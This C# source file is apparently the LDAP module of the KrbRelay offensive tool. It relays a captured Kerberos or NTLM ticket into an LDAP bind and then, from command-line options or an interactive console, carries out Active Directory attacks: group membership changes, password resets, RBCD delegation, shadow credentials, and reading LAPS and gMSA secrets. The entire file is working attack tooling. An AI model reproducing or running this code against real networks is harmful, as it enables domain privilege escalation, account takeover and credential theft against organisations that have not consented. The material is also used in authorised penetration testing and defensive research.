using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using static KrbRelay.Natives;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Ldap
    {
        public static void Connect()
        {
            //create berval struct with the kerberos ticket
            var sTicket = new SecBuffer(ticket);
            var berval = new berval
            {
                bv_len = sTicket.cbBuffer,
                bv_val = sTicket.pvBuffer
            };
            var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
            Marshal.StructureToPtr(berval, bervalPtr, false);
            var bind = ldap_sasl_bind(
                ld,
                "",
                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                bervalPtr,
                IntPtr.Zero,
                IntPtr.Zero,
                out IntPtr servresp);
            Console.WriteLine("[*] bind: {0}", bind);
            ldap_get_option(ld, 0x0031, out int value);
            Console.WriteLine("[*] ldap_get_option: {0}", (LdapStatus)value);

            if ((LdapStatus)value == LdapStatus.LDAP_SUCCESS)
            {
                Console.WriteLine("[+] LDAP session established");
                
                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        ldapConsole(ld, attacks["console"]);
                    }
                    if (attacks.Keys.Contains("add-groupmember"))
                    {
                        List<string> parts;
                        parts = Regex.Matches(attacks["add-groupmember"], @"[\""].+?[\""]|[^ ]+")
                            .Cast<Match>()
                            .Select(m => m.Value)
                            .ToList();

                        string arg1 = parts[0].Trim('"');
                        string arg2 = parts[1].Trim('"');

                        Attacks.Ldap.addGroupMember.attack(ld, arg1, arg2);
                    }
                    if (attacks.Keys.Contains("reset-password"))
                    {
                        string arg1 = attacks["reset-password"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["reset-password"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Ldap.setPassword.attack(ld, arg1, arg2);
                    }
                    if (attacks.Keys.Contains("rbcd"))
                    {
                        string arg1 = attacks["rbcd"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["rbcd"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Ldap.RBCD.attack(ld, arg1, arg2);
                    }
                    if (attacks.Keys.Contains("shadowcred"))
                    {
                        string arg1 = relayedUser;
                        if (!string.IsNullOrEmpty(attacks["shadowcred"]))
                            arg1 = attacks["shadowcred"];

                        Attacks.Ldap.ShadowCredential.attack(ld, arg1);
                    }
                    if (attacks.Keys.Contains("laps"))
                    {
                        Attacks.Ldap.LAPS.read(ld, attacks["laps"]);
                    }
                    if (attacks.Keys.Contains("gmsa"))
                    {
                        Attacks.Ldap.gMSA.read(ld, attacks["gmsa"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                ldap_unbind(ld);
                Environment.Exit(0);
            }
            if ((LdapStatus)value != LdapStatus.LDAP_SASL_BIND_IN_PROGRESS)
            {
                Console.WriteLine("[-] Ldap failed");
                Environment.Exit(0);
            }
            else
            {
                // get first ap_rep from ldap
                berval msgidp2 = (berval)Marshal.PtrToStructure(servresp, typeof(berval));
                byte[] msgidbytes = new byte[msgidp2.bv_len];
                Marshal.Copy(msgidp2.bv_val, msgidbytes, 0, msgidp2.bv_len);
                if (Program.ntlm)
                {
                    ntlm2 = msgidbytes;
                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
                }
                else
                {
                    apRep1 = msgidbytes;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
                }
            }
        }

        public static void ldapConsole(IntPtr ld, string optional = "")
        {
            bool exit = false;
            try
            {
                while (true)
                {
                    Console.Write("LDAP> ");
                    string input = Console.ReadLine();
                    string cmd = input.Split(' ')[0];
                    string arg1 = "";
                    string arg2 = "";
                    try
                    {
                        arg1 = input.Split(' ')[1];
                        arg2 = input.Split(' ')[2];
                    }
                    catch { }
                    switch (cmd)
                    {
                        case "user":
                            break;

                        case "computer":
                            break;

                        case "group":
                            break;

                        case "reset-password":
                            Attacks.Ldap.setPassword.attack(ld, arg1, arg2);
                            break;

                        case "add-groupmember":
                            Attacks.Ldap.addGroupMember.attack(ld, arg1, arg2);
                            break;

                        case "add-acl":
                            break;

                        case "rm-acl":
                            break;
                        
                        case "shadowcred":
                            if (string.IsNullOrEmpty(arg1))
                            {
                                Console.WriteLine("[-] shadowcred requires an argument");
                                break;
                            }
                            Attacks.Ldap.ShadowCredential.attack(ld, arg1);
                            break;

                        case "rbcd":
                            if (string.IsNullOrEmpty(arg1) || string.IsNullOrEmpty(arg2))
                            {
                                Console.WriteLine("[-] rbcd requires two arguments");
                                break;
                            }
                            Attacks.Ldap.RBCD.attack(ld, arg1, arg2);
                            break;

                        case "laps":
                            Attacks.Ldap.LAPS.read(ld, arg1);
                            break;

                        case "gmsa":
                            Attacks.Ldap.gMSA.read(ld, arg1);
                            break;

                        case "exit":
                            exit = true;
                            break;

                        default:
                            Console.WriteLine(
                                "Commands:\n" +
                                //"user <user>          - List user attributes\n" +
                                //"group <group>        - List group attributes\n" +
                                //"computer <computer>  - List computer attributes\n" +
                                "shadowcred  <TARGET>              - Configure msDS-KeyCredentialLink \n" +
                                "rbcd  <SID> <TARGET>              - Configure RBCD\n" +
                                "reset-password  <user> <password> - Reset user password\n" +
                                "add-groupmember <group> <user>    - Add member to group\n" +
                                "laps                              - Read LAPS\n" +
                                "gmsa                              - Read gMSA\n" +
                                //"rm-groupmember  <group> <user>    - Remove member from group\n" +
                                "exit\n");
                            break;
                    }
                    if (exit)
                    {
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}